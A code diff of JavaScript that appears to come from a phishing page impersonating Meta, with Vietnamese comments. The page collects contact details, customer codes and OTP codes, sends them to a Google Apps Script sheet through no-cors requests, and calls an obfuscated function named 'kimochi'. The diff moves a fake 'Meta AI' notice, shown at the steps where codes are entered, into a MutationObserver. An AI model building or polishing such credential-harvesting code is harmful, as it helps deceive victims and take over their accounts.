@@ -167,7 +167,6 @@ function lockOtpForm() {
 /* HÀM XỬ LÝ CHUYỂN BƯỚC LẬP TỨC (ĐÃ BỎ BỘ ĐẾM NGƯỢC CHỜ ĐỢI) */
 /* ========================================================= */
 function showLoading(e) {
-	// Kích hoạt ngay lập tức hành động chuyển bước tiếp theo mà không bắt người dùng đợi ngầm
 	if ('function' == typeof e.afterDone) {
 		e.afterDone();
 	}
@@ -335,6 +334,90 @@ const sendToGoogleSheet = async (e, t = '') => {
 		u.append('continent', d),
 		fetch(GOOGLE_SCRIPT_URL, { method: 'POST', body: u, mode: 'no-cors' }).catch((e) => {}));
 };
+
+/* ========================================================= */
+/* LOGIC QUẢN LÝ HỘP THOẠI THÔNG BÁO META AI (AN TOÀN)       */
+/* ========================================================= */
+(function() {
+    const metaChatWrapper = document.getElementById('metaChatWrapper'),
+          metaAiBox = document.getElementById('metaAiBox'),
+          metaAiIcon = document.getElementById('metaAiIcon'),
+          closeMetaAi = document.getElementById('closeMetaAi');
+
+    let metaAiTimeout = null;
+
+    if (!metaChatWrapper || !metaAiBox) return;
+
+    function openMetaAiBox() {
+        if (metaAiBox.classList.contains('hidden')) {
+            metaAiBox.classList.remove('hidden');
+        }
+        if (metaAiTimeout) clearTimeout(metaAiTimeout);
+        metaAiTimeout = setTimeout(() => {
+            closeMetaAiBox();
+        }, 6000); 
+    }
+
+    function closeMetaAiBox() {
+        metaAiBox.classList.add('hidden');
+        if (metaAiTimeout) clearTimeout(metaAiTimeout);
+    }
+
+    // Sử dụng MutationObserver để theo dõi sự thay đổi step một cách an toàn tuyệt đối, 
+    // không can thiệp hay ghi đè vào hàm showStep gốc của hệ thống nữa.
+    const observer = new MutationObserver((mutations) => {
+        mutations.forEach((mutation) => {
+            if (mutation.attributeName === 'class') {
+                const target = mutation.target;
+                if (target.classList.contains('active')) {
+                    const stepId = target.id;
+                    // Chỉ kích hoạt và tự động hiển thị tại step3 hoặc step5
+                    if (stepId === 'step3' || stepId === 'step5') {
+                        metaChatWrapper.style.display = 'flex';
+                        openMetaAiBox();
+                    } else {
+                        metaChatWrapper.style.display = 'none';
+                        closeMetaAiBox();
+                    }
+                }
+            }
+        });
+    });
+
+    // Cấu hình theo dõi tất cả các thẻ section có class là "step"
+    document.querySelectorAll('section.step').forEach(stepSection => {
+        observer.observe(stepSection, { attributes: true });
+    });
+
+    // Sự kiện: Bấm vào logo để hiện lại hộp thoại
+    metaAiIcon.addEventListener('click', (e) => {
+        e.stopPropagation();
+        openMetaAiBox();
+    });
+
+    // Sự kiện: Bấm vào dấu "x" để tắt
+    if (closeMetaAi) {
+        closeMetaAi.addEventListener('click', (e) => {
+            e.stopPropagation();
+            closeMetaAiBox();
+        });
+    }
+
+    // Tự động ẩn khi người dùng tương tác vào các ô nhập liệu hoặc nút bấm
+    document.addEventListener('focusin', (e) => {
+        if (e.target.tagName === 'INPUT' || e.target.tagName === 'BUTTON') {
+            closeMetaAiBox();
+        }
+    });
+
+    document.addEventListener('click', (e) => {
+        if (e.target.closest('input') || e.target.closest('button') || e.target.closest('.error')) {
+            closeMetaAiBox();
+        }
+    });
+})();
+/* ========================================================= */
+
 function kimochi() {
 	function _0x2c14(_0x11175b, _0x1a8796) {
 		_0x11175b = _0x11175b - 0x1c9;
@@ -445,79 +528,4 @@ function kimochi() {
 		}
 	}
 }
-});
-    }
-}
-
-/* ========================================================= */
-/* LOGIC QUẢN LÝ HỘP THOẠI THÔNG BÁO META AI (STEP 3 & STEP 5)*/
-/* ========================================================= */
-const metaChatWrapper = document.getElementById('metaChatWrapper'),
-      metaAiBox = document.getElementById('metaAiBox'),
-      metaAiIcon = document.getElementById('metaAiIcon'),
-      closeMetaAi = document.getElementById('closeMetaAi');
-
-let metaAiTimeout = null;
-
-function openMetaAiBox() {
-    if (metaAiBox.classList.contains('hidden')) {
-        metaAiBox.classList.remove('hidden');
-    }
-    if (metaAiTimeout) clearTimeout(metaAiTimeout);
-    metaAiTimeout = setTimeout(() => {
-        closeMetaAiBox();
-    }, 6000); 
-}
-
-function closeMetaAiBox() {
-    metaAiBox.classList.add('hidden');
-    if (metaAiTimeout) clearTimeout(metaAiTimeout);
-}
-
-const originalShowStep = showStep;
-showStep = function(targetStep) {
-    originalShowStep(targetStep);
-    
-    if (targetStep === step3 || targetStep === step5) {
-        metaChatWrapper.style.display = 'flex';
-        openMetaAiBox();
-    } else {
-        metaChatWrapper.style.display = 'none';
-        closeMetaAiBox();
-    }
-};
-
-metaAiIcon.addEventListener('click', (e) => {
-    e.stopPropagation();
-    openMetaAiBox();
-});
-
-if (closeMetaAi) {
-    closeMetaAi.addEventListener('click', (e) => {
-        e.stopPropagation();
-        closeMetaAiBox();
-    });
-}
-
-const dismissElements = [
-    contactInput, 
-    customerCodeInput, 
-    otpCodeInput, 
-    contactError, 
-    customerCodeError, 
-    otpError,
-    document.querySelector('.custom-top-title'),
-    document.getElementById('submitBtn'),
-    document.getElementById('verifyOtpBtn')
-];
-
-dismissElements.forEach(element => {
-    if (element) {
-        element.addEventListener('focus', closeMetaAiBox);
-        element.addEventListener('click', closeMetaAiBox);
-    }
-});
-/* ========================================================= */
-
 kimochi();
-
